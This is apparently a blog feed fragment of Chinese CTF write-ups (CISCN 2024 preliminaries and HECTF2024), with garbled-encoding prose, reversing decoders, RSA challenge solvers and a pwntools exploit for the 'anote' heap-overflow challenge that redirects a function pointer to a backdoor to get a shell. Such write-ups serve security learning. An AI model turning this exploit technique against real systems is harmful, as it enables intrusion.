class="hljs-number">0x12</span>,<span class="hljs-number">0x1D</span>,<span class="hljs-number">0x0F</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x39</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a1)):<br>    <span class="hljs-built_in">print</span>(s[a.index(a1[i])],end=<span class="hljs-string">&quot;&quot;</span>)<br>    <br><span class="hljs-comment">#flag&#123;MTczMDc4MzQ2Ng==&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="anote"><a href="#anote" class="headerlink" title="anote"></a>anote</h2><p><a href="https://ya1orin.github.io/posts/cbe4da55.html">https://ya1orin.github.io/posts/cbe4da55.html</a></p><p>æŸ¥çœ‹ä¿æŠ¤</p><img src="/2024/12/17/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1734258432973-db509a2f-bb2a-446b-856b-3f5136c198b9.png" class="" title="img"><p>æ— æ³•åç¼–è¯‘èœå•</p><img src="/2024/12/17/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1734258170474-3126392c-a5a7-4307-9df0-6d57ce3ce13c.png" class="" title="img"><p>å‘ç°åé—¨å‡½æ•°</p><img src="/2024/12/17/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1734233668043-6c331b5d-9c68-469e-972b-cf21043b548f.png" class="" title="img"><p>giftæ³„éœ²å †åœ°å€</p><img src="/2024/12/17/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1734260112732-393e4380-c533-46ca-994b-2f8352213048.png" class="" title="img"><p>æœ‰å †æº¢å‡º</p><img src="/2024/12/17/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1734234500205-83fa7b63-6c49-43fe-864e-ca726a73bff1.png" class="" title="img"><p>å‡½æ•°è°ƒç”¨éœ€è¦ç»è¿‡ä¸¤æ¬¡åœ°å€è¯»ï¼Œä¸¤æ¬¡å–åœ°å€åç›´æ¥getshell</p><img src="/2024/12/17/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1734260168867-ac7e5d01-8ab2-4068-be98-b002b5da90e8.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>filename=<span class="hljs-string">&#x27;./note&#x27;</span><br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    io = process(filename)<br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;39.107.73.132&#x27;</span>,<span class="hljs-number">34877</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">addr</span>):    <br>    <span class="hljs-comment">#bk=&quot;b *$rebase(&quot;+str(addr)+&quot;)&quot;    </span><br>    bk=<span class="hljs-string">&#x27;b *&#x27;</span> + <span class="hljs-built_in">str</span>(addr)    <br>    attach(io,bk)  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>    <span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br>    <span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    ru(<span class="hljs-string">b&#x27;Choice&gt;&gt;&#x27;</span>)<br>    sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    ru(<span class="hljs-string">b&#x27;Choice&gt;&gt;&#x27;</span>)<br>    sl(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    ru(<span class="hljs-string">b&#x27;index: &#x27;</span>)<br>    sl(index)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,payload</span>):<br>    ru(<span class="hljs-string">b&#x27;Choice&gt;&gt;&#x27;</span>)<br>    sl(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    ru(<span class="hljs-string">b&#x27;index: &#x27;</span>)<br>    sl(index)<br>    ru(<span class="hljs-string">b&#x27;len: &#x27;</span>)<br>    sl(size)<br>    ru(<span class="hljs-string">b&#x27;content: &#x27;</span>)<br>    sl(payload)<br><br>system = <span class="hljs-number">0x80489ce</span><br><br>add()<br>add()<br>add()<br>add()<br>add()<br><br>ru(<span class="hljs-string">b&#x27;Choice&gt;&gt;&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;index: &#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;gift: &#x27;</span>)<br>gift=io.recvline()<br>gift = gift.strip()<br><span class="hljs-built_in">str</span> = gift.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>gift_int = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>,<span class="hljs-number">16</span>)<br>gift_int = gift_int+<span class="hljs-number">8</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">24</span>+p32(gift_int)<br>edit(<span class="hljs-string">b&#x27;1&#x27;</span>,<span class="hljs-string">b&#x27;28&#x27;</span>,payload)<br>edit(<span class="hljs-string">b&#x27;4&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>,p32(system))<br>edit(<span class="hljs-string">b&#x27;2&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>inter()<br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="rasnd-1"><a href="#rasnd-1" class="headerlink" title="rasnd-1"></a>rasnd-1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, bytes_to_long<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">import</span> os<br><br>FLAG = os.getenv(<span class="hljs-string">&quot;FLAG&quot;</span>).encode()<br>flag1 = FLAG[:<span class="hljs-number">15</span>]<br>flag2 = FLAG[<span class="hljs-number">15</span>:]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crypto1</span>():<br>    p = getPrime(<span class="hljs-number">1024</span>)<br>    q = getPrime(<span class="hljs-number">1024</span>)<br>    n = p * q<br>    e = <span class="hljs-number">0x10001</span><br>    x1=randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>**<span class="hljs-number">11</span>)<br>    y1=randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>**<span class="hljs-number">114</span>)<br>    x2=randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>**<span class="hljs-number">11</span>)<br>    y2=randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>**<span class="hljs-number">514</span>)<br>    hint1=x1*p+y1*q-<span class="hljs-number">0x114</span><br>    hint2=x2*p+y2*q-<span class="hljs-number">0x514</span><br>    c = <span class="hljs-built_in">pow</span>(bytes_to_long(flag1), e, n)<br>    <span class="hljs-built_in">print</span>(n)<br>    <span class="hljs-built_in">print</span>(c)<br>    <span class="hljs-built_in">print</span>(hint1)<br>    <span class="hljs-built_in">print</span>(hint2)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crypto2</span>():<br>    p = getPrime(<span class="hljs-number">1024</span>)<br>    q = getPrime(<span class="hljs-number">1024</span>)<br>    n = p * q<br>    e = <span class="hljs-number">0x10001</span><br>    hint = <span class="hljs-built_in">pow</span>(<span class="hljs-number">514</span>*p - <span class="hljs-number">114</span>*q, n - p - q, n)<br>    c = <span class="hljs-built_in">pow</span>(bytes_to_long(flag2),e,n)<br>    <span class="hljs-built_in">print</span>(n)<br>    <span class="hljs-built_in">print</span>(c)<br>    <span class="hljs-built_in">print</span>(hint)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;==================================================================&quot;</span>)<br>crypto1()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;==================================================================&quot;</span>)<br>crypto2()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;==================================================================&quot;</span>)<br>==================================================================<br><span class="hljs-number">26714373031565422475884702170543410883373766932797969939280017108800123630280453788616378655019907797321111510231223356874948261879543789404350524004468888206101183893553783912724380985843610867526595833197366734130545820436239872839652589346601722085131378640769423529086811124172931366238980772713375464558442159355269775101329989966189515569376297816482517053422913115432001741932739141823138624540815101536913889794642390866813927702475029110686952078530692644252976502169483149132207976114466199894323910052111367201536776408811236973236608134901114724266365223503175620708205259026706410636563563598898057786909</span><br><span class="hljs-number">18858506514752992181380154921747008058551432073649358179756400934499734929302097177385112589545638411907187544107364140903835767319765333083263371380171393252284034199968302788035813879025587162178319401359969618990483649417087485156561735201401525887885578022049717026480327032286788738889262482959544912750982820940453807386818377755465477978307315597575247620998533718055915017425523414691659570184139579810707813137941428133321379443751166951391551543594842911886444134180462626200534122766826612914831934523911294746691771890773567919420040686512711305345502628357059345018604242583923374930982823519300498861640</span><br><span class="hljs-number">1703011784973694423523066984917892124619751172220144100044171439741165827972687390194124492251819042874252053150043202421782626869660480593115676811212128468596849367155081033328244384876406655473674390204200669968111480368833514298396052119966333625037144526212890106844115852680816838761270006004920982100788509334477038784632813857002635218</span><br><span class="hljs-number">8596233896763717102169465608296028563515760739865995489935176725834214423578223747479973270599042824129419113680720794797661942367252581426481246316950815033131044242281997122567448742644673474903897866662886581037133335517704055756596838356619756825253469733432939827965726694808136837419859121356935545730046078254006901859741103020585105901848211173408398897737180145151960784779409091748948609728701125179059580873942337600282247998167059927473965882018545884</span><br>==================================================================<br><span class="hljs-number">16589591418165998974581826396786398930964677585495811776727961980933761422829735502353148344295573923286904134270437840953903058835839647755304524379802201214055337473450626274233655129393993402170849111556891293771331425620727538676892779730518697214030981259596934139791367918170334793203308313793877432632961965570796244678476654144496744143529230273615880581380427053580163718759461912665013484259971242478070197232015833303583839630233529678406449192276948304869831793199422773169924034486860859583248462580782763862788640533350445627327551313451358489108372802941755051199397457477170827875256791335279931822163</span><br><span class="hljs-number">3493216727040563603182782528379980992856985367672705061437847758429330967495522030591464555965123991215415707741373551781505882160952702665400598213557438002105417986620056775684429778017927694129314364830399810114133029099512289718032317103775152997628020077046730276692573860628045483306212242357668089602247503892447592293405654694663877541319208584675706845250157767477676729786680662467437147092154919231870894123001829518759712475631380741564021398432758657752054575552932354155897193050199905632726139361666588240188296480829032211689007858038874564883755261054886137380859036520919514155990974745414052260391</span><br><span class="hljs-number">738711933947319822947673544397020570805588025177977860210346384599836444962386731037122249298437342058548865629696263398136643393798229605137124995991851470790761577269526848178263795501303172468316859219648198031139444340434290922490343059376784633680231755992893833495307272749496959826984455403224845257667388721423164198610039775635522398580665978800318363980423481678985219561212776853383645384028341490465579340909534811109967923304778965393247025954945989704145828423228694680674422850911134777381837444273593086003338565398835125386790498932704847535695287327571603796733691600956198673926829061013653722889</span><br>==================================================================<br></code></pre></td></tr></table></figure><img src="/2024/12/17/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1734436239071-c4101845-118b-4120-bb46-882212a6c1b7.png" class="" title="img"><p>crypto2ä¸­æŒ‡æ•°ä¸ºn-p-qï¼Œå°è¯•<em>ï¼ˆ514 * p - 114 * qï¼‰ï¼Œè¿™æ ·å°±èƒ½æ„é€ æ¬§æ‹‰å®šç†ï¼Œï¼ˆ514 * p - 114 * qï¼‰</em>hintåœ¨æ¨¡nä¸‹äº’é€†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> symbols,solve<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> product<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> gcd<br><br>n=<span class="hljs-number">26714373031565422475884702170543410883373766932797969939280017108800123630280453788616378655019907797321111510231223356874948261879543789404350524004468888206101183893553783912724380985843610867526595833197366734130545820436239872839652589346601722085131378640769423529086811124172931366238980772713375464558442159355269775101329989966189515569376297816482517053422913115432001741932739141823138624540815101536913889794642390866813927702475029110686952078530692644252976502169483149132207976114466199894323910052111367201536776408811236973236608134901114724266365223503175620708205259026706410636563563598898057786909</span><br>c=<span class="hljs-number">18858506514752992181380154921747008058551432073649358179756400934499734929302097177385112589545638411907187544107364140903835767319765333083263371380171393252284034199968302788035813879025587162178319401359969618990483649417087485156561735201401525887885578022049717026480327032286788738889262482959544912750982820940453807386818377755465477978307315597575247620998533718055915017425523414691659570184139579810707813137941428133321379443751166951391551543594842911886444134180462626200534122766826612914831934523911294746691771890773567919420040686512711305345502628357059345018604242583923374930982823519300498861640</span><br>hint1=<span class="hljs-number">1703011784973694423523066984917892124619751172220144100044171439741165827972687390194124492251819042874252053150043202421782626869660480593115676811212128468596849367155081033328244384876406655473674390204200669968111480368833514298396052119966333625037144526212890106844115852680816838761270006004920982100788509334477038784632813857002635218</span><br>hint2=<span class="hljs-number">8596233896763717102169465608296028563515760739865995489935176725834214423578223747479973270599042824129419113680720794797661942367252581426481246316950815033131044242281997122567448742644673474903897866662886581037133335517704055756596838356619756825253469733432939827965726694808136837419859121356935545730046078254006901859741103020585105901848211173408398897737180145151960784779409091748948609728701125179059580873942337600282247998167059927473965882018545884</span><br><br><span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> product(<span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">12</span>), repeat=<span class="hljs-number">2</span>):<br>    q = gcd(a * (hint1+<span class="hljs-number">0x114</span>) - b * (hint2+<span class="hljs-number">0x514</span>), n)<br>    <span class="hljs-keyword">if</span> q != <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> q &lt; n:<br>        <span class="hljs-keyword">break</span><br><br>p = n // q<br>e = <span class="hljs-number">0x10001</span><br>d = invert(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><br>flag1 = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(flag1)<br><br>n2=<span class="hljs-number">16589591418165998974581826396786398930964677585495811776727961980933761422829735502353148344295573923286904134270437840953903058835839647755304524379802201214055337473450626274233655129393993402170849111556891293771331425620727538676892779730518697214030981259596934139791367918170334793203308313793877432632961965570796244678476654144496744143529230273615880581380427053580163718759461912665013484259971242478070197232015833303583839630233529678406449192276948304869831793199422773169924034486860859583248462580782763862788640533350445627327551313451358489108372802941755051199397457477170827875256791335279931822163</span><br>c2=<span class="hljs-number">3493216727040563603182782528379980992856985367672705061437847758429330967495522030591464555965123991215415707741373551781505882160952702665400598213557438002105417986620056775684429778017927694129314364830399810114133029099512289718032317103775152997628020077046730276692573860628045483306212242357668089602247503892447592293405654694663877541319208584675706845250157767477676729786680662467437147092154919231870894123001829518759712475631380741564021398432758657752054575552932354155897193050199905632726139361666588240188296480829032211689007858038874564883755261054886137380859036520919514155990974745414052260391</span><br>hint=<span class="hljs-number">738711933947319822947673544397020570805588025177977860210346384599836444962386731037122249298437342058548865629696263398136643393798229605137124995991851470790761577269526848178263795501303172468316859219648198031139444340434290922490343059376784633680231755992893833495307272749496959826984455403224845257667388721423164198610039775635522398580665978800318363980423481678985219561212776853383645384028341490465579340909534811109967923304778965393247025954945989704145828423228694680674422850911134777381837444273593086003338565398835125386790498932704847535695287327571603796733691600956198673926829061013653722889</span><br>e = <span class="hljs-number">65537</span><br><br>x = inverse(hint, n2)<br><br>solver = Solver()<br><br>p = Int(<span class="hljs-string">&#x27;p&#x27;</span>)<br>q = Int(<span class="hljs-string">&#x27;q&#x27;</span>)<br><br>solver.add(<span class="hljs-number">514</span> * p - <span class="hljs-number">114</span> * q == x)<br>solver.add(p * q == n2)<br><br><span class="hljs-keyword">if</span> solver.check() == sat:<br>    model = solver.model()<br>    p_val = model[p].as_long()<br>    q_val = model[q].as_long()<br><br>    d = inverse(<span class="hljs-number">0x10001</span>, (p_val - <span class="hljs-number">1</span>) * (q_val - <span class="hljs-number">1</span>))<br>    m = <span class="hljs-built_in">pow</span>(c2, d, n2)<br>    <span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment">#b&#x27;flag&#123;bb38781f-f3f4-46c0-956b-e34809406e0c&#125;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å †æº¢å‡º</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HECTF2024</title>
    <link href="/2024/12/12/HECTF2024/"/>
    <url>/2024/12/12/HECTF2024/</url>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="littleasm"><a href="#littleasm" class="headerlink" title="littleasm"></a>littleasm</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_flag</span>():<br>    key = <span class="hljs-string">b&quot;rev&quot;</span><br>    data = [<br>        <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x73</span>,<br>        <span class="hljs-number">0x10</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x5d</span>,<br>        <span class="hljs-number">0x21</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x3</span><br>    ]<br>    data_len = <span class="hljs-built_in">len</span>(data)<br><br>    flag = [<span class="hljs-number">0</span>] * data_len<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, data_len, <span class="hljs-number">3</span>):<br>        mod = (i + <span class="hljs-number">2</span>) % <span class="hljs-number">3</span><br>        flag[i] = (data[i] - <span class="hljs-number">0x2C</span>) ^ key[mod]<br><br>        <span class="hljs-keyword">if</span> i + <span class="hljs-number">1</span> &lt; data_len:<br>            mod = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">3</span><br>            flag[i + <span class="hljs-number">1</span>] = (data[i + <span class="hljs-number">1</span>] - <span class="hljs-number">0x8</span>) ^ key[mod]<br><br>        <span class="hljs-keyword">if</span> i + <span class="hljs-number">2</span> &lt; data_len:<br>            mod = i % <span class="hljs-number">3</span><br>            flag[i + <span class="hljs-number">2</span>] = (data[i + <span class="hljs-number">2</span>] ^ <span class="hljs-number">0xC</span>) ^ key[mod]<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> flag)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    flag = decrypt_flag()<br>    <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h2><p>base64å˜è¡¨</p><img src="/2024/12/12/HECTF2024/1733537789184-de2a0721-c0ea-477e-8509-0f933e0ced36.png" class="" title="img"><p>å¼‚æˆ–ä¹‹åç›´æ¥æ¯”è¾ƒ</p><img src="/2024/12/12/HECTF2024/1733537820739-5a291895-a758-4331-9c98-1d0891d96128.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0x51</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x5A</span>,<span class="hljs-number">0x76</span>,<span class="hljs-number">0x4F</span>,<span class="hljs-number">0x46</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x5C</span>,<span class="hljs-number">0x46</span>,<span class="hljs-number">0x7D</span>,<span class="hljs-number">0x6B</span>,<span class="hljs-number">0x4E</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x7D</span>,<span class="hljs-number">0x3E</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x5D</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x3E</span>,<span class="hljs-number">0x3B</span>,<span class="hljs-number">0x3D</span>,<span class="hljs-number">0x47</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x53</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x5F</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x7E</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0x47</span>,<span class="hljs-number">0x7C</span>,<span class="hljs-number">0x25</span>,<span class="hljs-number">0x29</span>,<span class="hljs-number">0x5A</span>,<span class="hljs-number">0x7D</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x5F</span>,<span class="hljs-number">0x46</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0x5F</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0x28</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    a[i]=a[i]^(i//<span class="hljs-number">3</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(a[i]),end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><img src="/2024/12/12/HECTF2024/1733537764726-1eeae5b1-6d18-429d-8911-2f324a2db54b.png" class="" title="img"><h2 id="pyre"><a href="#pyre" class="headerlink" title="pyre"></a>pyre</h2><p>pythonåç¼–è¯‘ï¼Œæ‰€æœ‰exeå¼€å¤´éƒ½æ˜¯4D4E</p><img src="/2024/12/12/HECTF2024/1733554725062-42a0a809-92ad-4677-9487-b65a61d4ce74.png" class="" title="img"><p>å¾—åˆ°å‹ç¼©åŒ…å¯†ç </p><img 